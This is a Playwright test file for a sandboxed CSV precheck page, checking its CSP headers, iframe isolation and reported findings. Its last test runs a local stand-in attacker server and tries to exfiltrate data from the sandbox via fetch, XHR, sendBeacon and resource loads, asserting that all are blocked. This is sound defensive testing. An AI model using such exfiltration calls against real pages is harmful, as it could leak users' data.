import { readFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { fileURLToPath } from "node:url";
import { expect, test, type Frame, type Page } from "@playwright/test";

// A stand-in for an attacker's server: any request reaching it means data could leave the page.
let exfil: Server;
let exfilUrl: string;
let exfilHits: string[];

test.beforeAll(async () => {
  exfil = createServer((req, res) => {
    exfilHits.push(req.url ?? "");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.end("ok");
  });
  await new Promise<void>((resolve) => exfil.listen(0, "127.0.0.1", resolve));
  exfilUrl = `http://127.0.0.1:${(exfil.address() as AddressInfo).port}`;
});

test.afterAll(() => new Promise<void>((resolve) => exfil.close(() => resolve())));

test.beforeEach(() => {
  exfilHits = [];
});

async function sandbox(page: Page): Promise<Frame> {
  await page.goto("/csv-precheck/");
  const frame = page.frame({ url: /\/sandbox\/csv-precheck\/$/ });
  if (!frame) throw new Error("sandbox frame not found");
  await frame.waitForLoadState();
  return frame;
}

async function openCsv(
  frame: Frame,
  text = "Id,Name\n001000000000001,Acme\n",
  name = "accounts.csv",
) {
  await frame.locator("#file").setInputFiles({
    name,
    mimeType: "text/csv",
    buffer: Buffer.from(text),
  });
}

const raggedFixture = readFileSync(
  fileURLToPath(new URL("./fixtures/ragged-duplicate.csv", import.meta.url)),
);
const repeatedKeyFixture = readFileSync(
  fileURLToPath(new URL("./fixtures/repeated-key.csv", import.meta.url)),
);

test("sandbox pages ship the CSP header", async ({ request }) => {
  const res = await request.get("/sandbox/csv-precheck/");
  const csp = res.headers()["content-security-policy"];
  expect(csp).toContain("connect-src 'none'");
  expect(csp).toContain("default-src 'none'");
  expect(csp).toContain("frame-ancestors 'self'");
});

test("the iframe is sandboxed without same-origin access", async ({ page }) => {
  await page.goto("/csv-precheck/");
  const flags = await page.locator("iframe.sandbox-frame").getAttribute("sandbox");
  expect(flags?.split(" ").sort()).toEqual(["allow-downloads", "allow-scripts"]);
});

test("a clean file shows no problems with its counts, and the report downloads", async ({
  page,
}) => {
  const frame = await sandbox(page);
  await openCsv(frame);
  await expect(frame.locator("#file-name")).toHaveText("accounts.csv");
  await expect(frame.locator("#summary")).toHaveText("1 row, 2 columns, comma-delimited");
  await expect(frame.locator("#clean")).toBeVisible();
  await expect(frame.locator(".finding")).toHaveCount(0);

  const [download] = await Promise.all([
    page.waitForEvent("download"),
    frame.locator("#download").click(),
  ]);
  const body = await download.createReadStream().then(async (stream) => {
    const chunks: Buffer[] = [];
    for await (const chunk of stream) chunks.push(chunk as Buffer);
    return Buffer.concat(chunks).toString();
  });
  expect(body).toBe(
    "File: accounts.csv\n1 row, 2 columns, comma-delimited\n\nNo problems found.\n",
  );
});

test("a file with ragged rows and a duplicate header shows those findings", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, raggedFixture.toString(), "ragged-duplicate.csv");
  await expect(frame.locator("#summary")).toHaveText("5 rows, 4 columns, comma-delimited");
  await expect(frame.locator("#clean")).toBeHidden();

  const kinds = await frame
    .locator(".finding")
    .evaluateAll((els) => els.map((el) => (el as HTMLElement).dataset.kind));
  expect(kinds).toEqual(["duplicate-header", "row-too-few-columns", "row-too-many-columns"]);

  const duplicate = frame.locator('[data-kind="duplicate-header"]');
  await expect(duplicate).toContainText('Columns 2 "Name", 4 "name"');
  await expect(duplicate.locator(".severity")).toHaveText("Error");

  const tooMany = frame.locator('[data-kind="row-too-many-columns"]');
  await expect(tooMany.locator(".count")).toHaveText("(2)");
  await expect(tooMany.locator(".example")).toHaveText([
    "Row 3 (line 4): Error reading data row #2: the number of columns (5) exceeds the number of columns in the header (4)",
    "Row 4 (line 5): Error reading data row #3: the number of columns (5) exceeds the number of columns in the header (4)",
  ]);
  await expect(frame.locator('[data-kind="row-too-few-columns"] .example')).toHaveText(
    "Row 2 (line 3): Error reading data row #1: the number of columns (3) is less than the number of columns in the header (4)",
  );
});

test("repeated rows show, and picking a key column shows its repeated values", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, repeatedKeyFixture.toString(), "repeated-key.csv");
  await expect(frame.locator('[data-kind="duplicate-row"] .example')).toHaveText("Rows 2, 7");
  await expect(frame.locator('[data-kind="duplicate-key"]')).toHaveCount(0);
  await expect(frame.locator("#key-line")).toBeHidden();

  await frame.locator("#key-column").selectOption({ label: "Account_Number__c" });
  const keyed = frame.locator('[data-kind="duplicate-key"]');
  await expect(keyed.locator(".finding-title")).toContainText(
    'Repeated values in key column 2 "Account_Number__c"',
  );
  await expect(keyed.locator(".example")).toHaveText(['"AC-200": Rows 2, 4, 7']);
  await expect(frame.locator("#key-line")).toHaveText(
    'Key column 2 "Account_Number__c", compared exactly as written',
  );

  await frame.locator("#key-loose").check();
  await expect(keyed.locator(".example")).toHaveText([
    '"AC-100": Rows 1, 3',
    '"AC-200": Rows 2, 4, 7',
  ]);
  await expect(frame.locator("#key-line")).toContainText(
    "ignoring letter case and surrounding spaces",
  );

  const [download] = await Promise.all([
    page.waitForEvent("download"),
    frame.locator("#download").click(),
  ]);
  const body = await download.createReadStream().then(async (stream) => {
    const chunks: Buffer[] = [];
    for await (const chunk of stream) chunks.push(chunk as Buffer);
    return Buffer.concat(chunks).toString();
  });
  expect(body).toContain('  - "AC-100": Rows 1, 3\n');

  await frame.locator("#key-column").selectOption({ label: "None" });
  await expect(keyed).toHaveCount(0);
  await expect(frame.locator("#key-line")).toBeHidden();
  await expect(frame.locator('[data-kind="duplicate-row"]')).toHaveCount(1);
});

test("opening another file resets the key column to its own headers", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, repeatedKeyFixture.toString(), "repeated-key.csv");
  await frame.locator("#key-column").selectOption({ label: "Name" });
  await expect(frame.locator('[data-kind="duplicate-key"]')).toHaveCount(1);

  await openCsv(frame, "Id,\n1,a\n1,a\n", "other.csv");
  await expect(frame.locator("#key-column option")).toHaveText(["None", "Id", "Column 2"]);
  await expect(frame.locator("#key-column")).toHaveValue("");
  await expect(frame.locator('[data-kind="duplicate-key"]')).toHaveCount(0);
});

test("thousands of ragged rows read as one finding with a count", async ({ page }) => {
  const frame = await sandbox(page);
  // Distinct rows, so the duplicate-row check stays quiet.
  const rows = Array.from({ length: 5000 }, (_, i) => `${i},2,3\n`).join("");
  await openCsv(frame, "a,b\n" + rows);
  const finding = frame.locator(".finding");
  await expect(finding).toHaveCount(1);
  await expect(finding.locator(".count")).toHaveText("(5,000)");
  await expect(finding.locator(".example")).toHaveCount(5);
  await expect(finding.locator(".more")).toHaveText("and 4,995 more");
});

test("opening a second file replaces the first report", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, raggedFixture.toString(), "ragged-duplicate.csv");
  await expect(frame.locator(".finding")).toHaveCount(3);

  await openCsv(frame, "Id;Name\n1;Acme\n2;Beta\n", "clean.csv");
  await expect(frame.locator("#file-name")).toHaveText("clean.csv");
  await expect(frame.locator("#summary")).toHaveText("2 rows, 2 columns, semicolon-delimited");
  await expect(frame.locator(".finding")).toHaveCount(0);
  await expect(frame.locator("#clean")).toBeVisible();
});

test("the report fits a phone-width screen", async ({ page }) => {
  await page.setViewportSize({ width: 360, height: 740 });
  const frame = await sandbox(page);
  await openCsv(frame, raggedFixture.toString(), "ragged-duplicate.csv");
  await expect(frame.locator(".finding")).toHaveCount(3);
  const overflow = await frame.evaluate(
    () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
  );
  expect(overflow).toBeLessThanOrEqual(0);
});

test("the hosting page cannot read the sandbox document", async ({ page }) => {
  await sandbox(page);
  const access = await page.evaluate(() => {
    const iframe = document.querySelector<HTMLIFrameElement>("iframe.sandbox-frame")!;
    try {
      return iframe.contentDocument === null ? "blocked" : "readable";
    } catch {
      return "blocked";
    }
  });
  expect(access).toBe("blocked");
});

test("the sandbox cannot send anything over the network", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame);

  const outcomes = await frame.evaluate(async (target) => {
    const attempt = (p: Promise<unknown>) =>
      p.then(
        () => "sent",
        () => "blocked",
      );
    const settle = (el: HTMLElement & { onload: unknown; onerror: unknown }) =>
      new Promise<string>((resolve) => {
        el.onload = () => resolve("sent");
        el.onerror = () => resolve("blocked");
        document.body.append(el);
        setTimeout(() => resolve("blocked"), 2000);
      });

    const img = document.createElement("img");
    img.src = `${target}/img`;
    const script = document.createElement("script");
    script.src = `${target}/script`;
    const style = document.createElement("link");
    style.rel = "stylesheet";
    style.href = `${target}/style`;

    return {
      fetch: await attempt(fetch(`${target}/fetch`)),
      fetchSameOrigin: await attempt(fetch("/")),
      xhr: await new Promise<string>((resolve) => {
        const xhr = new XMLHttpRequest();
        try {
          xhr.open("GET", `${target}/xhr`);
          xhr.onload = () => resolve("sent");
          xhr.onerror = () => resolve("blocked");
          xhr.send();
        } catch {
          resolve("blocked");
        }
      }),
      beacon: navigator.sendBeacon(`${target}/beacon`, "data") ? "queued" : "blocked",
      img: await settle(img),
      script: await settle(script),
      style: await settle(style),
    };
  }, exfilUrl);

  expect(outcomes).toMatchObject({
    fetch: "blocked",
    fetchSameOrigin: "blocked",
    xhr: "blocked",
    img: "blocked",
    script: "blocked",
    style: "blocked",
  });
  // sendBeacon may report "queued" before CSP drops it; what counts is that nothing arrives.
  await page.waitForTimeout(500);
  expect(exfilHits).toEqual([]);
});
